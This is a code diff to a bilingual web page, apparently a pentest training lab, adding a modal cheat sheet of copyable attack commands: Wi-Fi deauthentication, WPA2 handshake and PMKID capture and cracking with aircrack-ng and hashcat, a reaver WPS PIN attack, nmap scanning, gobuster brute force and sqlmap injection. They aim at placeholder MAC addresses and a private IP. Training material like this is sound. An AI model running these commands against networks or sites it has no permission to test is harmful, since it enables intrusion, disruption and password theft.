@@ -134,6 +134,9 @@
             </ul>
 
             <div class="flex items-center gap-3">
+                <button class="btn btn-outline btn-sm" onclick="Components.openModal('modal-cheatsheet')" title="Comandos Rápidos">
+                    <i class="fa-solid fa-bolt" style="color: var(--accent-warning);"></i> Cheat Sheet
+                </button>
                 <button class="btn btn-ghost btn-sm" id="lang-toggle" aria-label="Toggle Language">
                     <i class="fa-solid fa-globe"></i> EN
                 </button>
@@ -2744,7 +2747,154 @@ document.addEventListener('DOMContentLoaded', function() {
 
     </template>
 
+    <!-- Cheat Sheet Modal -->
+    <div class="modal-overlay" id="modal-cheatsheet">
+        <div class="modal-content" style="max-width: 850px; width: 95%;">
+            <div class="modal-header">
+                <h2><i class="fa-solid fa-bolt" style="color: var(--accent-warning);"></i> <span data-lang-pt>Cheat Sheet de Comandos Rápidos</span><span data-lang-en>Quick Command Cheat Sheet</span></h2>
+                <button class="btn-close" data-modal="modal-cheatsheet"><i class="fa-solid fa-xmark"></i></button>
+            </div>
+            <div class="modal-body" style="max-height: 75vh; overflow-y: auto;">
+                <p class="text-muted text-sm" style="margin-bottom: var(--space-4);">
+                    <span data-lang-pt>Guia de referência rápida com as sintaxes mais utilizadas no laboratório. Clique em <strong>Copiar</strong> para usar no seu terminal.</span>
+                    <span data-lang-en>Quick reference guide with the most common syntax used in labs. Click <strong>Copy</strong> to use in your terminal.</span>
+                </p>
+
+                <div class="search-box" style="margin-bottom: var(--space-6);">
+                    <i class="fa-solid fa-magnifying-glass search-icon"></i>
+                    <input type="text" placeholder="Filtrar comandos (ex: hashcat, airodump, nmap, sqlmap)..." data-search-target=".cheat-item">
+                    <span class="search-count text-xs text-muted"></span>
+                </div>
+
+                <div style="display: flex; flex-direction: column; gap: var(--space-4);">
+
+                    <!-- Item 1 -->
+                    <div class="cheat-item card-flat" style="padding: var(--space-4);" data-search-text="airmon-ng monitor modo interface wifi aircrack">
+                        <div class="flex justify-between items-center" style="margin-bottom: var(--space-2);">
+                            <strong style="color: var(--accent-primary); font-size: var(--fs-sm);"><i class="fa-solid fa-tower-broadcast"></i> Ativar Modo Monitor</strong>
+                            <span class="badge badge-sm">Aircrack-ng</span>
+                        </div>
+                        <div class="command-box">
+                            <code>sudo airmon-ng start wlan0</code>
+                            <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button>
+                        </div>
+                    </div>
+
+                    <!-- Item 2 -->
+                    <div class="cheat-item card-flat" style="padding: var(--space-4);" data-search-text="airodump-ng scan escaneamento redes bssid captura bssid canal">
+                        <div class="flex justify-between items-center" style="margin-bottom: var(--space-2);">
+                            <strong style="color: var(--accent-primary); font-size: var(--fs-sm);"><i class="fa-solid fa-radar"></i> Escanear e Capturar Canal Focado</strong>
+                            <span class="badge badge-sm">Aircrack-ng</span>
+                        </div>
+                        <div class="command-box">
+                            <code>sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w captura wlan0mon</code>
+                            <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button>
+                        </div>
+                    </div>
+
+                    <!-- Item 3 -->
+                    <div class="cheat-item card-flat" style="padding: var(--space-4);" data-search-text="aireplay-ng deauth desautenticacao forcar handshake cliente">
+                        <div class="flex justify-between items-center" style="margin-bottom: var(--space-2);">
+                            <strong style="color: var(--accent-danger); font-size: var(--fs-sm);"><i class="fa-solid fa-bolt"></i> Enviar Ataque de Desautenticação (Deauth)</strong>
+                            <span class="badge badge-sm">Aircrack-ng</span>
+                        </div>
+                        <div class="command-box">
+                            <code>sudo aireplay-ng -0 10 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon</code>
+                            <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button>
+                        </div>
+                    </div>
+
+                    <!-- Item 4 -->
+                    <div class="cheat-item card-flat" style="padding: var(--space-4);" data-search-text="aircrack-ng crack quebrar senha wordlist rockyou">
+                        <div class="flex justify-between items-center" style="margin-bottom: var(--space-2);">
+                            <strong style="color: var(--accent-primary); font-size: var(--fs-sm);"><i class="fa-solid fa-key"></i> Quebrar Handshake WPA2 (CPU)</strong>
+                            <span class="badge badge-sm">Aircrack-ng</span>
+                        </div>
+                        <div class="command-box">
+                            <code>aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 00:11:22:33:44:55 captura-01.cap</code>
+                            <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button>
+                        </div>
+                    </div>
+
+                    <!-- Item 5 -->
+                    <div class="cheat-item card-flat" style="padding: var(--space-4);" data-search-text="hashcat convert hcxpcapngtool 22000 gpu crack rockyou">
+                        <div class="flex justify-between items-center" style="margin-bottom: var(--space-2);">
+                            <strong style="color: var(--accent-purple); font-size: var(--fs-sm);"><i class="fa-solid fa-fire"></i> Converter .cap e Quebrar com Hashcat (GPU)</strong>
+                            <span class="badge badge-sm">Hashcat</span>
+                        </div>
+                        <div class="command-box" style="margin-bottom: var(--space-2);">
+                            <code>hcxpcapngtool -o hash.hc22000 captura-01.cap</code>
+                            <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button>
+                        </div>
+                        <div class="command-box">
+                            <code>hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt --force</code>
+                            <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button>
+                        </div>
+                    </div>
+
+                    <!-- Item 6 -->
+                    <div class="cheat-item card-flat" style="padding: var(--space-4);" data-search-text="wash reaver wps pin attack pixie dust bully">
+                        <div class="flex justify-between items-center" style="margin-bottom: var(--space-2);">
+                            <strong style="color: var(--accent-warning); font-size: var(--fs-sm);"><i class="fa-solid fa-unlock"></i> Detectar e Atacar WPS Pin</strong>
+                            <span class="badge badge-sm">Reaver / Wash</span>
+                        </div>
+                        <div class="command-box" style="margin-bottom: var(--space-2);">
+                            <code>sudo wash -i wlan0mon</code>
+                            <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button>
+                        </div>
+                        <div class="command-box">
+                            <code>sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -vv -K</code>
+                            <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button>
+                        </div>
+                    </div>
+
+                    <!-- Item 7 -->
+                    <div class="cheat-item card-flat" style="padding: var(--space-4);" data-search-text="hcxdumptool pmkid capture sem cliente">
+                        <div class="flex justify-between items-center" style="margin-bottom: var(--space-2);">
+                            <strong style="color: var(--accent-purple); font-size: var(--fs-sm);"><i class="fa-solid fa-bolt"></i> Capturar PMKID Sem Cliente</strong>
+                            <span class="badge badge-sm">hcxdumptool</span>
+                        </div>
+                        <div class="command-box">
+                            <code>sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=3</code>
+                            <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button>
+                        </div>
+                    </div>
+
+                    <!-- Item 8 -->
+                    <div class="cheat-item card-flat" style="padding: var(--space-4);" data-search-text="nmap scan varredura portas servicos os ping sweep">
+                        <div class="flex justify-between items-center" style="margin-bottom: var(--space-2);">
+                            <strong style="color: var(--accent-secondary); font-size: var(--fs-sm);"><i class="fa-solid fa-search"></i> Escanear Portas, Serviços e SO (Nmap)</strong>
+                            <span class="badge badge-sm">Nmap</span>
+                        </div>
+                        <div class="command-box">
+                            <code>sudo nmap -sS -sV -O -p- 192.168.1.100</code>
+                            <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button>
+                        </div>
+                    </div>
+
+                    <!-- Item 9 -->
+                    <div class="cheat-item card-flat" style="padding: var(--space-4);" data-search-text="sqlmap gobuster web diretorios sqli database">
+                        <div class="flex justify-between items-center" style="margin-bottom: var(--space-2);">
+                            <strong style="color: var(--accent-pink); font-size: var(--fs-sm);"><i class="fa-solid fa-globe"></i> Brute Force de Diretórios e SQL Injection</strong>
+                            <span class="badge badge-sm">Web Tools</span>
+                        </div>
+                        <div class="command-box" style="margin-bottom: var(--space-2);">
+                            <code>gobuster dir -u http://192.168.1.100/ -w /usr/share/wordlists/dirb/common.txt</code>
+                            <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button>
+                        </div>
+                        <div class="command-box">
+                            <code>sqlmap -u "http://192.168.1.100/index.php?id=1" --dbs --batch</code>
+                            <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i></button>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+        </div>
+    </div>
+
     <!-- Scripts -->
+
     <script src="js/components.js"></script>
     <script src="js/progress.js"></script>
     <script src="js/commands.js"></script>
